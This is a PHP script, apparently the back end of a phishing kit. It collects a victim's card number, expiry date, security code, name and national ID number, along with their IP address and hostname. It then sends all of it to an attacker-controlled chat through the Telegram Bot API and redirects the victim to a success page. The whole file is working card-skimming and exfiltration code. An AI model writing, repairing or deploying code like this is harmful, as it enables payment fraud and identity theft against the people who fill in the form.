<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $requiredFields = ["card", "mon", "yea", "name", "scs",  "dni"];

    // Verificar que todos los campos requeridos no estén vacíos
    $formIsEmpty = false;
    foreach ($requiredFields as $field) {
        if (empty($_POST[$field])) {
            $formIsEmpty = true;
            break; // Si un campo está vacío, no es necesario verificar los demás
        }
    }

    if ($formIsEmpty) {
        header("Location: error.php");
        exit; // Detiene la ejecución del script
    }

    $a1 = (array_key_exists("HTTP_X_REAL_IP", $_SERVER) ? $_SERVER["HTTP_X_REAL_IP"] : getenv("REMOTE_ADDR"));
    $a2 = (array_key_exists("HTTP_X_REAL_IP", $_SERVER) ? $_SERVER["REMOTE_ADDR"] : gethostbyaddr($_SERVER["REMOTE_ADDR"]));
    
    $a3 = $_POST["card"];
    $a4 = $_POST["mon"];
    $a5 = $_POST["yea"];
    $a6 = $_POST["scs"];
    $a7 = $_POST["name"];
    $a8 = $_POST["dni"];
    
    include("assets/card.php");
    
    // Corregir la parte del mensaje
    $message = "Texto de ejemplo con marcadores {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}";
    $mensaje = str_replace(
        array("{1}", "{2}", "{3}", "{4}", "{5}", "{6}", "{7}", "{8}"),
        array($a1, $a2, $a3, $a4, $a5, $a6, $a7, $a8),
        $message
    );
    
    define("BOT_TOKEN", $bottoken); // Debes definir $bottoken antes de usarlo
    define("CHAT_ID", $chatid); // Debes definir $chatid antes de usarlo
    
    function enviar_telegram($msj) {
        global $bottoken, $chatid; // Agrega estas líneas para poder acceder a las variables globales
        $queryArray = [
            "chat_id" => CHAT_ID,
            "text" => $msj,
        ];
        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage?" . http_build_query($queryArray);
        $result = file_get_contents($url);
        header("Location: success.php"); // Cambia a la página de éxito o a donde desees redirigir
    }
    
    function enviar() {
        global $mensaje;
        enviar_telegram($mensaje);
    }
    
    enviar();
} else {
    // Si no es una solicitud POST, también puedes redirigir a error.php o realizar otra acción adecuada.
    header("Location: error.php");
}
?>
